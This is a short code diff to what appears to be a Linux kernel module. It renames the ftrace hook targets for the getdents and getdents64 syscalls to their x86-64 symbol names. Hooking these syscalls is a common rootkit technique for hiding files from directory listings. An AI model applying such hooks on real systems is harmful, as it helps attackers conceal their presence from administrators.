@@ -345,8 +345,8 @@ done:
 
 /* Declare the struct that ftrace needs to hook the syscall */
 static struct ftrace_hook hooks[] = {
-    HOOK("sys_getdents64", hook_getdents64, &orig_getdents64),
-    HOOK("sys_getdents", hook_getdents, &orig_getdents),
+    HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
+    HOOK("__x64_sys_getdents", hook_getdents, &orig_getdents),
 };
 
 /* Module initialization function */
